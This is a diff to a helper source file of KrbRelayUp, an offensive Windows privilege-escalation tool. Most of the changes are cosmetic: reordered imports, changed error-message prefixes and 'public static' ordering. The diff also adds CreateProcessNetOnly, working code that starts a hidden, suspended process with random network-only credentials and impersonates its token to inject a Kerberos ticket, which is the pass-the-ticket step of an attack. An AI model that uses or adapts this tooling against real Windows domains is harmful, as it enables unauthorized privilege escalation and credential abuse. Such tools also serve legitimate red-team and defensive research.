@@ -1,15 +1,15 @@
-﻿using System;
+using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
 using System.Linq;
-using System.Runtime.InteropServices;
 using System.Security.Principal;
 using System.Text.RegularExpressions;
 using System.Threading;
 using System.DirectoryServices;
 using System.DirectoryServices.Protocols;
 using KrbRelayUp.lib.Interop;
+using System.Runtime.InteropServices;
 
 namespace KrbRelayUp
 {
@@ -58,8 +58,8 @@ namespace KrbRelayUp
 
             if ((hex.Length % 16) != 0)
             {
-                Console.WriteLine("\r\n[X] Hash must be 16, 32 or 64 characters in length\r\n");
-                System.Environment.Exit(1);
+                Console.WriteLine("\r\n[-] Hash must be 16, 32 or 64 characters in length\r\n");
+                Environment.Exit(1);
             }
 
             // yes I know this inefficient
@@ -94,7 +94,7 @@ namespace KrbRelayUp
             }
             catch
             {
-                Console.WriteLine("[X] Error invalid multiplier specified {0}, skipping.", increase.Substring(0, increase.Length - 1));
+                Console.WriteLine("[-] Error invalid multiplier specified {0}, skipping.", increase.Substring(0, increase.Length - 1));
                 return returnDate;
             }
 
@@ -195,24 +195,122 @@ namespace KrbRelayUp
             return currentSid.IsWellKnown(WellKnownSidType.LocalSystemSid);
         }
 
+        public static LUID CreateProcessNetOnly(string commandLine, bool show = false, string username = null, string domain = null, string password = null, byte[] kirbiBytes = null)
+        {
+            // creates a hidden process with random /netonly credentials,
+            //  displayng the process ID and LUID, and returning the LUID
+
+            // Note: the LUID can be used with the "ptt" action
+            Console.WriteLine("[+] Importing ticket into a sacrificial process using CreateNetOnly");
+
+            Interop.PROCESS_INFORMATION pi;
+            var si = new Interop.STARTUPINFO();
+            si.cb = Marshal.SizeOf(si);
+            if (!show)
+            {
+                // hide the window
+                si.wShowWindow = 0;
+                si.dwFlags = 0x00000001;
+            }
+
+            var luid = new LUID();
+
+            if (username == null) { username = Helpers.RandomString(8); }
+            if (domain == null) { domain = Helpers.RandomString(8); }
+            if (password == null) { password = Helpers.RandomString(8); }
+
+            // 0x00000002 == LOGON_NETCREDENTIALS_ONLY
+            // 4 == CREATE_SUSPENDED.
+            if (!Interop.CreateProcessWithLogonW(username, domain, password, 0x00000002, null, commandLine, 4, 0, Environment.CurrentDirectory, ref si, out pi))
+            {
+                var lastError = Interop.GetLastError();
+                Console.WriteLine("[-] CreateProcessWithLogonW error: {0}", lastError);
+                return new LUID();
+            }
+
+            Console.WriteLine("[+] Process         : '{0}' successfully created with LOGON_TYPE = 9", commandLine);
+            Console.WriteLine("[+] ProcessID       : {0}", pi.dwProcessId);
+
+            var hToken = IntPtr.Zero;
+            // TOKEN_QUERY == 0x0008, TOKEN_DUPLICATE == 0x0002
+            var success = Interop.OpenProcessToken(pi.hProcess, 0x000A, out hToken);
+            if (!success)
+            {
+                var lastError = Interop.GetLastError();
+                Console.WriteLine("[-] OpenProcessToken error: {0}", lastError);
+                return new LUID();
+            }
+
+            if (kirbiBytes != null)
+            {
+                IntPtr hDupToken = IntPtr.Zero;
+                success = Interop.DuplicateToken(hToken, 2, ref hDupToken);
+                if (!success)
+                {
+                    Console.WriteLine("[!] CreateProcessNetOnly() - DuplicateToken failed!");
+                    return new LUID();
+                }
+
+                try
+                {
+                    success = Interop.ImpersonateLoggedOnUser(hDupToken);
+                    if (!success)
+                    {
+                        Console.WriteLine("[!] CreateProcessNetOnly() - ImpersonateLoggedOnUser failed!");
+                        return new LUID();
+                    }
+                    LSA.ImportTicket(kirbiBytes, new LUID());
+                }
+                finally
+                {
+                    Interop.RevertToSelf();
+                    // clean up the handles we created
+                    Interop.CloseHandle(hDupToken);
+                }
+            }
+            Interop.ResumeThread(pi.hThread);
+
+            bool Result;
+            Interop.TOKEN_STATISTICS TokenStats = new Interop.TOKEN_STATISTICS();
+            int TokenInfLength;
+            Result = Interop.GetTokenInformation(hToken, Interop.TOKEN_INFORMATION_CLASS.TokenStatistics, out TokenStats, Marshal.SizeOf(TokenStats), out TokenInfLength);
+            Interop.CloseHandle(hToken);
+
+            if (Result)
+            {
+                luid = new LUID(TokenStats.AuthenticationId);
+                Console.WriteLine("[+] LUID            : {0}", luid);
+                Console.WriteLine("[+] System service should be started in background");
+            }
+            else
+            {
+                var lastError = Interop.GetLastError();
+                Console.WriteLine("[-] GetTokenInformation error: {0}", lastError);
+                Interop.CloseHandle(hToken);
+                return new LUID();
+            }
+
+            return luid;
+        }
+
         #endregion
 
 
         #region File Helpers
 
-        static public string GetBaseFromFilename(string filename)
+        public static string GetBaseFromFilename(string filename)
         {
             return SplitBaseAndExtension(filename)[0];
         }
 
-        static public string GetExtensionFromFilename(string filename)
+        public static string GetExtensionFromFilename(string filename)
         {
             return SplitBaseAndExtension(filename)[1];
         }
 
         // Splits filename by into a basename and extension 
         // Returns an array representing [basename, extension]
-        static public string[] SplitBaseAndExtension(string filename)
+        public static string[] SplitBaseAndExtension(string filename)
         {
             string[] result = { filename, "" };
             string[] splitName = filename.Split('.');
@@ -226,7 +324,7 @@ namespace KrbRelayUp
             return result;
         }
 
-        static public string MakeValidFileName(string filePath)
+        public static string MakeValidFileName(string filePath)
         {
             // Can't use IO.Path.GetFileName and IO.Path.GetDirectoryName because they get confused by illegal file name characters (the whole reason we are here)
             string fileName = filePath;
@@ -277,7 +375,7 @@ namespace KrbRelayUp
             }
         }
 
-        static public int SearchBytePattern(byte[] pattern, byte[] bytes)
+        public static int SearchBytePattern(byte[] pattern, byte[] bytes)
         {
             List<int> positions = new List<int>();
             int patternLength = pattern.Length;
@@ -298,7 +396,7 @@ namespace KrbRelayUp
             return 0;
         }
 
-        static public bool WriteBytesToFile(string filename, byte[] data, bool overwrite = false)
+        public static bool WriteBytesToFile(string filename, byte[] data, bool overwrite = false)
         {
             bool result = true;
             string filePath = Path.GetFullPath(filename);
@@ -309,7 +407,7 @@ namespace KrbRelayUp
                 {
                     if (File.Exists(filePath))
                     {
-                        throw new Exception(String.Format("{0} already exists! Data not written to file.\r\n", filePath));
+                        throw new Exception($"{filePath} already exists! Data not written to file.\r\n");
                     }
                 }
                 File.WriteAllBytes(filePath, data);
@@ -348,7 +446,7 @@ namespace KrbRelayUp
             "msds-supportedencryptiontypes"
         };
 
-        static public List<IDictionary<string, Object>> GetADObjects(List<SearchResultEntry> searchResults)
+        public static List<IDictionary<string, Object>> GetADObjects(List<SearchResultEntry> searchResults)
         {
             var ActiveDirectoryObjects = new List<IDictionary<string, Object>>();
 
@@ -398,7 +496,7 @@ namespace KrbRelayUp
             return ActiveDirectoryObjects;
         }
 
-        static public List<IDictionary<string, Object>> GetADObjects(SearchResultCollection searchResults)
+        public static List<IDictionary<string, Object>> GetADObjects(SearchResultCollection searchResults)
         {
             var ActiveDirectoryObjects = new List<IDictionary<string, Object>>();
 
